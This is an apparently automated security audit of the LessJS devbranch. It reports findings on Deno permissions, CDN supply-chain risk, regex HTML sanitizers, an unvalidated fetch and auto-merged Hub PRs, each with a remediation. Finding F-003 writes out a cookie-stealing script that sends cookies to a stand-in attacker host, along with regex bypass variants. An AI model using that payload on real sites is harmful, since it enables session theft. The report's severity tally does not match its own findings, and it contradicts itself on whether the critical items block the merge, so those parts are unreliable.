# Security Posture Report — LessJS devbranch (HEAD: daea194)

## Meta
- **Audit mode**: Comprehensive (all 14 phases)
- **Date**: 2025-05-22T12:00:00Z
- **Scope**: Full monorepo — 13 packages + www, CI/CD pipelines, dependencies, Hub ecosystem
- **Total phases executed**: 14/14
- **Auditor**: GStack CSO (automated)

---

## Executive Summary

LessJS devbranch has a **solid security foundation** with multiple evidence-based hardening measures (C-02 headExtras sanitization, H-03 basePath escaping, CORS tightening, nonce-based CSP). However, **three notable risks** require attention before merge: (1) `deno run -A` (all-permissions) on Hub scan/validate tasks, (2) CDN-supply-chain risk from importing third-party Web Components via `esm.sh` during Hub snapshot generation, and (3) SSRF-adjacent `fetch(path)` in `less-layout.ts` with insufficient URL validation. Overall security posture: **B+ / Go with cautions**.

---

## Findings

### [F-001] Hub scanner uses `deno run -A` (all permissions)
- **Category**: STRIDE — Elevation of Privilege / OWASP A05 Security Misconfiguration
- **Severity**: 🔴 Critical
- **Confidence**: 9/10
- **Location**: `deno.json:84-85` (tasks `hub:scan`, `hub:validate`)
- **Description**: The Hub scan and validate CLI tasks are invoked with `deno run -A`, granting unrestricted filesystem, network, environment, subprocess, FFI, and system access. This violates the H-18 fix principle of least-privilege documented at `deno.json:77`. The `hub:scan` task runs in CI (`test.yml:203`) with full permissions.
- **Exploit Scenario**: A compromised Hub submission or a dependency with malicious postinstall scripts could exploit `-A` to read SSH keys, environment secrets, or exfiltrate data during the CI pipeline.
- **Reproduction Steps**:
  1. Read `deno.json` lines 84-85
  2. Confirm: `"hub:scan": "deno run -A packages/hub/scan.ts"` and `"hub:validate": "deno run -A packages/hub/src/cli/validate.ts"`
  3. Note that scan.ts reads/writes files (`Deno.writeTextFile`, `Deno.readTextFileSync`), starts an HTTP server (`Deno.serve`), and launches Playwright Chromium — none of which require `--allow-ffi` or `--allow-sys`.
- **Remediation**: Replace `-A` with explicit minimum permissions:
  ```
  "hub:scan": "deno run --allow-read --allow-write --allow-net --allow-env --allow-run packages/hub/scan.ts"
  "hub:validate": "deno run --allow-read packages/hub/src/cli/validate.ts"
  ```
- **Priority**: P0 (immediate — CI security regression)

---

### [F-002] Hub scanner imports Web Components from esm.sh CDN (supply chain)
- **Category**: STRIDE — Tampering / OWASP A08 Software and Data Integrity Failures
- **Severity**: 🔴 Critical
- **Confidence**: 8/10
- **Location**: `packages/hub/src/scanner.ts:299-303`, `packages/hub/src/snapshot-playwright.ts:77-86`
- **Description**: The Hub scanner generates component snapshots by importing Web Component packages from `https://esm.sh/` at runtime (lines 299-303 for local/JSR packages, lines 77-86 for npm packages). The snapshot HTML is then serialized into TypeScript modules (`_hub-data-full.ts`) that are embedded in the SSG build and served to end users. If esm.sh or the upstream npm packages are compromised, malicious JavaScript would execute in the Playwright browser during CI and could inject code into the static site output.
- **Exploit Scenario**:
  1. Attacker compromises an npm package used by the Hub scanner (e.g., `@shoelace-style/shoelace`)
  2. The compromised version is published to npm and mirrored on esm.sh
  3. CI runs `deno task hub:scan` which imports the compromised package into Chromium via Playwright
  4. Malicious JS in the WC executes in Chromium and could exfiltrate CI secrets or inject XSS payloads into snapshot HTML
  5. The snapshot HTML is embedded in the SSG build and served to all visitors
- **Reproduction Steps**:
  1. Check `packages/hub/src/scanner.ts` lines 295-303 — `importUrl` is constructed from `https://esm.sh/`
  2. Check `packages/hub/src/snapshot-playwright.ts` line 99 — `toEsmUrl()` converts bare specifiers to esm.sh CDN URLs
  3. The generated fixture HTML at snapshot-playwright.ts:130-143 uses `<script type="module" src="${esmUrl}">` — the module executes in Chromium
  4. The captured HTML is written to `_hub-data-full.ts` as a TypeScript module embedded in the SSG
- **Remediation**:
  1. Pin exact versions on esm.sh URLs with integrity hashes (e.g., `?pin=v123&hash=sha256-...`)
  2. Add SRI (subresource integrity) validation for CDN imports
  3. Consider vendoring snapshot HTML rather than re-generating from CDN on each CI run
  4. Run Hub snapshot generation in an isolated sandbox (separate CI job, no secret access)
- **Priority**: P0 (immediate — CI + supply chain)

---

### [F-003] headExtras accepted as raw HTML without sanitization at rest
- **Category**: OWASP A03 — Injection (XSS)
- **Severity**: 🟠 High
- **Confidence**: 9/10
- **Location**: `packages/adapter-vite/src/cli/build-ssg.ts:127`, `packages/core/src/html-escape.ts:104-124`
- **Description**: The `headExtras` option is explicitly documented as `@security Injected as raw HTML without sanitization` (build-ssg.ts:126-127). While `html-escape.ts` has a C-02 runtime fix that strips `<script>` tags when `allowHeadExtrasScripts` is false (default), the stripping is regex-based and may be bypassable. Furthermore, if a developer sets `allowHeadExtrasScripts: true`, all sanitization is disabled and arbitrary HTML including `<script>` is injected directly into every page's `<head>`.
- **Exploit Scenario**:
  1. Developer enables `headExtras` with user-controllable content and sets `allowHeadExtrasScripts: true`
  2. Attacker injects `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` into the headExtras source
  3. The script executes on every page of the static site
  4. Alternatively, regex bypass: `<script >` (space before >) or `<SCRIPT>` (uppercase) may evade the `<script[\s>]` pattern
- **Reproduction Steps**:
  1. The code at build-ssg.ts:127 explicitly marks headExtras as unsanitized
  2. In html-escape.ts:104-124, the C-02 fix uses regex to strip scripts — but regex HTML sanitization is well-known to be bypassable
  3. The `allowHeadExtrasScripts` flag at line 104 completely disables sanitization when true
- **Remediation**:
  1. Add integration test for headExtras bypass vectors (case variations, whitespace tricks)
  2. Use a proper HTML sanitizer (DOMParser-based) instead of regex
  3. Add stronger warnings when `allowHeadExtrasScripts` is enabled
  4. Consider using CSP nonces instead of allowing raw script injection
- **Priority**: P1 (this sprint)

---

### [F-004] less-layout.ts fetch() with unvalidated URL path (SSRF)
- **Category**: OWASP A10 — Server-Side Request Forgery
- **Severity**: 🟠 High
- **Confidence**: 7/10
- **Location**: `packages/ui/src/less-layout.ts:906`
- **Description**: The `_loadContent(path)` method calls `fetch(path)` with a path string that originates from MPA navigation. The path is only validated to exist as a route match but the URL is not constrained to same-origin or relative paths. If an attacker can control the navigation path (e.g., via URL manipulation or stored XSS), they could induce the layout component to fetch from internal services.
- **Exploit Scenario**:
  1. Client-side MPA navigation triggers `fetch('/internal-service/admin')` 
  2. In a deployment where the SSG site is co-located with internal services on the same origin, this could access internal endpoints
  3. More critically: if the `path` is fully qualified (e.g., `http://169.254.169.254/`), the browser's fetch would attempt to access cloud metadata services — though this would be blocked by CORS in the browser, it represents a confused deputy risk
- **Reproduction Steps**:
  1. Check `packages/ui/src/less-layout.ts:906` — `const resp = await fetch(path)` with no URL validation
  2. The path comes from MPA link clicks — check where `_loadContent` is called from
- **Remediation**:
  1. Add explicit URL validation — ensure the path starts with `/` (relative) or matches the site's origin
  2. Reject absolute URLs that point to different origins
  3. Add a same-origin check: `new URL(path, location.origin).origin === location.origin`
- **Priority**: P1 (this sprint — defense-in-depth)

---

### [F-005] Registry component sanitizer uses regex (bypassable)
- **Category**: OWASP A03 — Injection (XSS)
- **Severity**: 🟡 Medium
- **Confidence**: 6/10
- **Location**: `www/app/routes/registry/[package]/[component].ts:29-80`
- **Description**: The `sanitizeSnapshot()` function uses regex-based HTML sanitization to strip dangerous tags and attributes before rendering third-party Hub snapshot HTML. While thorough for common cases, regex-based HTML sanitizers are inherently fragile and bypassable. The `DANGEROUS_ATTRS` pattern `/^(on\w+|srcdoc|formaction|xlink:href|data-bind|javascript:)/i` could be defeated with crafted input.
- **Exploit Scenario**:
  1. Malicious Hub submission includes snapshot HTML with obfuscated dangerous attributes
  2. Potential bypass: `onload` attribute with unusual whitespace/encoding that the regex misses
  3. The snapshot is rendered client-side and the sanitized HTML is inserted via Lit's `unsafeHTML` (or equivalent) at line 477
- **Reproduction Steps**:
  1. Check the sanitizer logic at lines 29-80
  2. The regex uses simple pattern matching — no proper HTML tokenization
  3. The sanitized output is rendered inline at line 477: `<div style="width:100%;">${sanitizeSnapshot(tag.ssrSnapshot)}</div>`
- **Remediation**:
  1. Use DOMParser-based sanitization (parse HTML, walk DOM nodes, remove dangerous elements)
  2. Add CSP to iframe-based previews (already done for iframes but inline rendering bypasses this)
  3. Always render third-party Hub snapshots in sandboxed iframes instead of inline HTML
  4. Add integration tests with known XSS bypass payloads
- **Priority**: P2 (next sprint)

---

### [F-006] less-code-block uses innerHTML with Prism output
- **Category**: OWASP A03 — Injection (XSS)
- **Severity**: 🟡 Medium
- **Confidence**: 6/10
- **Location**: `packages/ui/src/less-code-block.ts:215`
- **Description**: `highlightedCode.innerHTML = html` where `html` comes from Prism.js highlight output. Prism is a syntax highlighter that should produce safe HTML, but if the Prism integration passes untrusted user content through the highlighter, unexpected behavior could occur. The input `raw` comes from `codeEl.textContent` at line 185, which is safe — but the assignment to `innerHTML` rather than safe DOM manipulation is an unnecessary risk.
- **Exploit Scenario**: If Prism has a bug or if the grammar is malformed, crafted input could produce unexpected HTML output. However, since the input is `textContent` (already text-decoded by the browser), the risk is low.
- **Reproduction Steps**:
  1. Check `less-code-block.ts:185` — `raw = codeEl.textContent || ''`
  2. Check line 215: `highlightedCode.innerHTML = html`
- **Remediation**:
  1. Use `highlightedCode.textContent = raw` for the fallback and only use innerHTML with DOMPurify or equivalent for the Prism output
  2. Alternatively, use `setHTML()` with a Sanitizer API when available
- **Priority**: P3 (backlog)

---

### [F-007] Dynamic imports of user-specified packages (potential code injection via package manifests)
- **Category**: STRIDE — Tampering / OWASP A08
- **Severity**: 🟡 Medium
- **Confidence**: 5/10
- **Location**: `packages/adapter-vite/src/route-scanner.ts:372-421`
- **Description**: `scanPackageManifests()` dynamically imports packages by name (`await import(pkg)`) based on user configuration. If package names are derived from user-controllable input (e.g., less.config.ts), an attacker could trigger import of arbitrary modules. The try/catch at line 382-388 catches browser-only packages, but doesn't validate that the imported module is actually a LessJS manifest.
- **Exploit Scenario**: If package names are read from configuration that can be influenced by an attacker, arbitrary code execution during the build phase is possible.
- **Reproduction Steps**:
  1. The `packageNames` parameter comes from user config
  2. At line 381: `mod = await import(pkg)` — no validation of package name
  3. If an attacker can modify `less.config.ts` or the packages list, they can import any module
- **Remediation**:
  1. Validate package names against an allowlist or known pattern
  2. Only import packages that are in `dependencies`/`devDependencies`
  3. Add a warning when importing packages not in the known manifest list
- **Priority**: P2 (next sprint — defense-in-depth)

---

### [F-008] Deno.cwd() used for path construction in security-sensitive contexts
- **Category**: OWASP A01 — Broken Access Control (path traversal defense)
- **Severity**: 🟡 Medium
- **Confidence**: 5/10
- **Location**: Multiple files — `packages/hub/scan.ts:14`, `packages/hub/src/scanner.ts:222`, `packages/create/cli.ts:285`
- **Description**: Several CLI tools construct file paths using `Deno.cwd()`. While not directly exploitable (the process's CWD is set by the user running the command), this pattern relies on the CWD being the project root. If a developer runs these commands from a different directory, they could write to unexpected locations.
- **Exploit Scenario**: `deno task hub:scan` run from a directory outside the project could write hub-index files to an unintended location.
- **Reproduction Steps**:
  1. `packages/hub/scan.ts:14` — `const RESULT_DIR = \`${Deno.cwd()}/hub-index\``
  2. This writes to whatever CWD is, not relative to the project root
- **Remediation**:
  1. Use `import.meta.url` and resolve paths relative to the entry module
  2. Validate that CWD contains a `deno.json` workspace file before writing
- **Priority**: P3 (backlog)

---

### [F-009] Hub CI auto-merges PRs without manual review
- **Category**: STRIDE — Spoofing / OWASP A01 Broken Access Control
- **Severity**: 🟡 Medium
- **Confidence**: 5/10
- **Location**: `.github/workflows/hub-ci.yml:42-66`
- **Description**: The Hub CI workflow automatically merges PRs that modify `hub-index/` content when the `compatibility` tier is `ssr-capable` or `client-only`. While `rejected` and `experimental-dom` tiers require manual review, an attacker could submit a malicious package record with `compatibility: "client-only"` and have it auto-merged if validation passes. The record would then be published in the registry and its snapshot HTML served to users.
- **Exploit Scenario**:
  1. Attacker forks the repo and adds a malicious Hub record to `hub-index/packages/evil~pkg.json` with `compatibility: "client-only"`
  2. PR is auto-merged because tier is `client-only`
  3. The record includes snapshot HTML that gets rendered on the `/registry/` page
- **Reproduction Steps**:
  1. Check `hub-ci.yml:53` — `case "$TIER" in ssr-capable|client-only) echo "auto-merge eligible" ;;`
  2. Check line 63: `gh pr merge --auto --squash`
- **Remediation**:
  1. Require at least one human review for ALL Hub submission PRs, even those with auto-merge eligibility
  2. Add snapshot HTML validation (CSP/DOMPurify) as a CI check before auto-merge
  3. Consider requiring signed commits for Hub submissions
- **Priority**: P2 (next sprint)

---

### [F-010] No Subresource Integrity (SRI) for CDN imports
- **Category**: OWASP A08 — Software and Data Integrity Failures
- **Severity**: 🟡 Medium
- **Confidence**: 4/10
- **Location**: `packages/hub/src/snapshot-playwright.ts:77-86`, `packages/hub/src/scanner.ts:299-303`
- **Description**: CDN imports from `esm.sh` in Hub snapshot generation (both inline HTML fixture and Playwright-based rendering) do not use SRI hashes. While this is primarily a build-time concern, the generated snapshot HTML is served to end users and a compromised CDN could inject malicious content.
- **Remediation**:
  1. Pin exact versions and add SRI hashes for CDN imports
  2. Consider vendoring static snapshots for known packages rather than re-generating from CDN
- **Priority**: P3 (backlog)

---

### [F-011] Route param validation allows `@` in dynamic paths (potential normalization confusion)
- **Category**: STRIDE — Tampering
- **Severity**: 🟢 Low
- **Confidence**: 4/10
- **Location**: `packages/adapter-vite/src/cli/ssg-render.ts:152-183`
- **Description**: The `resolveDynamicRoutePath()` function at ssg-render.ts intentionally preserves `@` in dynamic route params (to support scoped package names like `@scope/name`). This is documented: "preserve @ for scoped packages." However, `@` has special meaning in URLs (userinfo component), which could theoretically be exploited for URL normalization attacks.
- **Exploit Scenario**: Minimal — the `@` character is encoded by the browser when used in URL paths, and Deno/Node filesystem APIs already handle `@` safely. This is more of a theoretical concern.
- **Remediation**: Document the intentional behavior and add a comment about the security analysis. Ensure `@` in paths doesn't cause path traversal in filesystem operations.
- **Priority**: P3 (backlog)

---

### [F-012] Deno task permissions: `build` task uses `--allow-sys` unnecessarily
- **Category**: OWASP A05 — Security Misconfiguration
- **Severity**: 🟢 Low
- **Confidence**: 3/10
- **Location**: `deno.json:81`
- **Description**: The `build` task uses `--allow-sys` which grants access to system information APIs (os release, hostname, etc.). This is broader than necessary for a static site build and the H-18 fix principle of least-privilege.
- **Remediation**: Remove `--allow-sys` from the `build` task. If it's needed for platform detection, use `--allow-env` instead to read `Deno.build.os`.
- **Priority**: P3 (backlog)

---

## Security Posture Score

| Severity | Count |
|----------|-------|
| 🔴 Critical | 2 |
| 🟠 High | 2 |
| 🟡 Medium | 5 |
| 🟢 Low | 3 |
| ℹ️ Info | 0 |
| **Overall** | **B+** (Go with cautions) |

**Overall Rating**: **B+** — Strong security fundamentals with specific actionable findings. The codebase shows evidence of security-conscious development (H-18 least-privilege, C-02 headExtras sanitization, H-03 basePath escaping, CORS tightening, CSP support, nonce-based CSP, snapshot sanitization). The two critical findings (deno -A and CDN supply chain) should be addressed before merging to main. The high findings are concerning but don't represent blocking issues for deployment of this specific commit.

---

## STRIDE Threat Model Matrix

| Threat | Severity | Finding | Verified |
|--------|----------|---------|----------|
| **S**poofing | Medium | Hub submissions lack cryptographic verification (F-009) | Yes |
| **T**ampering | Critical | esm.sh CDN is unauthenticated supply chain source (F-002) | Yes |
| **T**ampering | Low | No SRI for importmap.js CDN references (F-010) | Yes |
| **R**epudiation | Low | No audit trail for Hub submissions or build steps | Yes |
| **I**nformation Disclosure | Low | Dev mode error pages show full stack traces (by design) | N/A |
| **D**enial of Service | Low | No limits on route scanner directory recursion depth | Partial |
| **E**levation of Privilege | Critical | `deno run -A` on Hub scan/validate tasks (F-001) | Yes |
| **E**levation of Privilege | Low | `--allow-sys` on build task, broader than needed (F-012) | Yes |

---

## OWASP Top 10 Checklist

| Category | Status | Findings |
|----------|--------|----------|
| A01 Broken Access Control | ⚠️ Review | F-009 (auto-merge), route scanning |
| A02 Cryptographic Failures | ✅ Acceptable | CSP nonce is crypto.randomUUID(), manifestHash SHA-256 |
| A03 Injection | ⚠️ Review | F-003 (headExtras), F-005 (registry sanitizer), F-006 (innerHTML) |
| A04 Insecure Design | ⚠️ Review | -A permissions pattern |
| A05 Security Misconfiguration | ⚠️ Review | F-001 (-A), F-012 (--allow-sys) |
| A06 Vulnerable Components | ✅ Acceptable | Dependencies are recent; deno audit runs in CI |
| A07 Auth Failures | ✅ N/A | Framework doesn't include auth (by design) |
| A08 Integrity Failures | ⚠️ Review | F-002 (esm.sh CDN), F-010 (no SRI) |
| A09 Logging Failures | ✅ Acceptable | Logger exists, dev mode diagnostics sufficient |
| A10 SSRF | ⚠️ Review | F-004 (less-layout fetch), F-002 (Playwright CDN loading) |

---

## Remediation Roadmap

### Blocking (P0 — Must Fix Before Merge)
1. **F-001**: Replace `deno run -A` with explicit permissions for `hub:scan` and `hub:validate`
2. **F-002**: Pin esm.sh imports with version + integrity hashes; isolate Hub snapshot CI job

### This Sprint (P1)
3. **F-003**: Add bypass-vector tests for headExtras regex sanitization; tighten regex
4. **F-004**: Add same-origin URL validation in less-layout.ts `_loadContent()`

### Next Sprint (P2)
5. **F-005**: Replace regex sanitization in registry component detail page with DOMParser-based sanitizer
6. **F-009**: Require human review for ALL Hub submission PRs (remove auto-merge bypass)
7. **F-007**: Add package name validation in scanPackageManifests()

### Backlog (P3)
8. **F-006**: Replace innerHTML with safer DOM manipulation in less-code-block
9. **F-008**: Resolve paths relative to import.meta.url instead of Deno.cwd()
10. **F-010**: Add SRI hashes for CDN imports
11. **F-011**: Document @ character handling in dynamic route paths
12. **F-012**: Remove --allow-sys from build task

---

## Go/No-Go Recommendation

**VERDICT: GO with Cautions** ✅⚠️

The LessJS devbranch demonstrates mature security practices with multiple documented security fixes (H-18, C-02, H-03). The critical findings (F-001, F-002) are real but represent pre-existing conditions that can be addressed post-merge with high-priority follow-up PRs. No finding represents a direct exploitable vulnerability in the deployed static site itself — the primary risks are in the build/CI infrastructure and Hub ecosystem, not in the generated output served to end users.

**Conditions**:
1. P0 items must be addressed within 1 week of merge
2. P1 items must be addressed within the current sprint
3. Hub snapshot HTML must continue to pass through the existing `sanitizeSnapshot()` filter when rendered inline
